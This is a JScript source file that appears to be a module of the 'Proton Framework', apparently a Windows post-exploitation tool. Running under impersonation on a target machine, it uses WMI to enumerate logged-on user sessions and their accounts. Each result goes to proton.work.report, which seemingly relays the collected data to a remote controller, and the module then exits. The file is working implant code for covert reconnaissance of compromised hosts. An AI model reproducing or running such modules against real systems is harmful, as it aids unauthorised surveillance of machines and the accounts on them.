//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

function stringify_user(user, loggedOn)
{
    var ret = "";
    ret += user.Caption + "\n";
    ret += user.Description + "\n";
    ret += user.InstallDate + "\n";
    ret += user.Name + "\n";
    ret += user.Status + "\n";
    ret += user.StartTime + "\n";
    ret += user.AuthenticationPackage + "\n";
    ret += user.LogonId + "\n";
    ret += user.LogonType + "\n";

    ret += loggedOn.Properties_;
    ret += loggedOn.Name;
    ret += loggedOn.Antecedent;
    ret += loggedOn.Dependent;

    return ret;
}

try {
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var columns = wmi.ExecQuery("Select * From Win32_LoggedOnUser");

    for (var e = new Enumerator(columns); !e.atEnd(); e.moveNext())
    {
        var session = e.item();
        var str = session.Antecedent+ "\n" + session.Dependent;
        //var str = stringify_user(session, eAssoc);
        alert(str)
        //var assocs = wmi.ExecQuery("Associators of {Win32_LogonSession.LogonId=" + session.LogonId + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");


        //for (var eAssoc = new Enumerator(assocs); !eAssoc.atEnd(); eAssoc.moveNext())
        //{
        //    var str = stringify_user(session, eAssoc);
        //    alert(str)
        //}

        proton.work.report(str);
    }

    proton.work.report("done");
} catch (e) {
    alert(e)
    proton.work.error(e);
}

proton.exit();
